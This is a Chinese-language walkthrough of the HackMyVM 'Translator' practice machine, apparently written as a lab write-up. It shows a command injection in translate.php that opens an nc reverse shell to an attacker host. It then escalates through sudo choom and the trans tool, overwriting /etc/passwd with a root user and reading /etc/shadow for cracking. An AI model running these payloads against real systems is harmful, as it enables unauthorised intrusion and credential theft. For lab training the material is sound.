[HackMyVm - Translator - YouTube](https://www.youtube.com/watch?v=xs6Pw9y_Ayg)
# 主机发现
```C
netdiscover -i eth0 -r 192.168.44.193/24
```
# 服务探测
```C
nmap -sV -A -T4 -p- 192.168.44.134
```
得到只开放了80和22端口

# 目录爆破

```css
gobuster dir -u http://192.168.44.134/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php
```

只是个输入框，尝试输入，发现我们输入的字符被替换了然后显示
尝试发现是26个字母倒叙替换
也可以通过https://www.dcode.fr/cipher-identifier 发现是使用atbash编码
但我直接写了个脚本
```Python
import sys

def reverse_alphabet_substitution(text):
    # 定义倒序字母映射字典
    reversed_alphabet = {
        'A': 'Z', 'B': 'Y', 'C': 'X', 'D': 'W', 'E': 'V',
        'F': 'U', 'G': 'T', 'H': 'S', 'I': 'R', 'J': 'Q',
        'K': 'P', 'L': 'O', 'M': 'N', 'N': 'M', 'O': 'L',
        'P': 'K', 'Q': 'J', 'R': 'I', 'S': 'H', 'T': 'G',
        'U': 'F', 'V': 'E', 'W': 'D', 'X': 'C', 'Y': 'B',
        'Z': 'A',
    }

    # 使用映射字典替换文本中的字母
    result = ''.join(reversed_alphabet.get(c.upper(), c) for c in text)

    return result.lower()

args = sys.argv

print(args[1])
# 示例文本
input_text = args[1]

# 应用替换函数
output_text = reverse_alphabet_substitution(input_text)

print(output_text)

```

# 反弹SHELL
sh -i >& /dev/tcp/ 192.168.44.128 / 9001 0>&1不行
```C
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ python translater.py nc+-e+/bin/bash+192.168.44.128+9001
nc+-e+/bin/bash+192.168.44.128+9001
mx -v /yrm/yzhs 192.168.44.128 9001
```
访问`http://192.168.44.134/translate.php?hmv=rw;mx -v /yrm/yzhs 192.168.44.128 9001

刚监听的shell不太好用，使用下面这条命令打开一个pty伪终端
```C
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm //设置终端类型为常见的xterm环境变量
stty -a//以容易阅读的方式打印当前的所有配置
stty raw -echo;fg//- 通过 `stty raw -echo` 将当前终端设置为原始模式并关闭回显。接着，使用分号 `;` 立即执行下一条命令。最后，`fg` 命令将最近放入后台的作业切换到前台运行，此时由于终端已处于原始模式且回显关闭，该作业可以直接接收用户的无干扰、未经处理的键盘输入。
reset //重新初始化终端
```
# 提权
**配置 sudo [命令](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.linuxcool.com%2F)在运行时而不输入密码。** |此设置在 /etc/sudoers文件中完成，这是使用 sudo [命令](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.linuxcool.com%2F)的默认安全策略；在用户权限指定部分

尝试读取第一个flag读取不到cat /home/ocean/user.txt

```C
cat hvxivg

┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ python translater.py Mb+kzhhdliw+rh+zbfie3w4          
Mb+kzhhdliw+rh+zbfie3w4
ny password is ayurv3d4
```
利用sudo 提权到india 账号
https://gtfobins.github.io/gtfobins/choom/
```C
su ocean //输入密码：ayurv3d4
sudo -l
//发现有个(india) NOPASSWD: /usr/bin/choom   这可以让我免密提权至india用户权限
```

也可以直接ssh：`ssh ocean@192.168.44.134

**choom**      命令是 util-linux 软件包的一部分
不会用这个命令就去找man：[choom(1) - Linux manual page](https://man7.org/linux/man-pages/man1/choom.1.html)
[Ubuntu Manpage: choom - display and adjust OOM-killer score.](https://manpages.ubuntu.com/manpages/focal/en/man1/choom.1.html)

```C
sudo -u india /usr/bin/choom -n 0 /bin/sh
script /dev/null -c bash
```

```C
sudo -l //(root) NOPASSWD: /usr/local/bin/trans
sudo -u root /usr/local/bin/trans//尝试以root权限运行该翻译软件
man /usr/local/bin/trans   //不会就问man,查看帮助命令
```

cat /etc/passwd发现可以显示，添加root用户
```C
cat /etc/passwd
cp /etc/passwd /tmp/passwd.bak
cp /etc/passwd /tmp/file
在kali中生成一个密码
mkpasswd -m sha-512
复制值到file的最后一行中,并按照格式修改成root用户hack:$6$8NJrwgxTZMywbrec$f7JVOZGjIXI0UnN6Ovdv0kzyqiWkhqpIgBOyJOX2AHX4Z4SGuBo8D17cYAolVkVbEtNwQ75ze90uhHbIsA21a0:0:0:root:/root:/bin/bash

sudo -u root /usr/local/bin/trans -i /tmp/file -o /etc/passwd -no-auto
su hack //密码：123
```

```C
root@translator:~# cat root.txt
h87M5364V2343ubvgfy
root@translator:~# cat /home/ocean/user.txt
a6765hftgnhvugy473f
```

方法二：
利用trans 进行提权，命令介绍：https://www.jianshu.com/p/da570df21ae8
这个是google的shell下翻译工具，所以google需要科学上网，我们在后面加上了-x代理，成功读取到shadow文件
```Css
sudo /usr/local/bin/trans -i /etc/shadow -x http://192.168.31.11:7890 -no-auto

sudo /usr/local/bin/trans -i /root/root.txt -x http://192.168.31.11:7890 -no-auto
```
读取后使用john 进行爆破，但是没有爆破出来。

```css
john shadow --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt
```
也可以通过如下命令直接提权到root，反正我是不成功

```css
sudo /usr/local/bin/trans -pager less -x http://192.168.31.11:7890
```
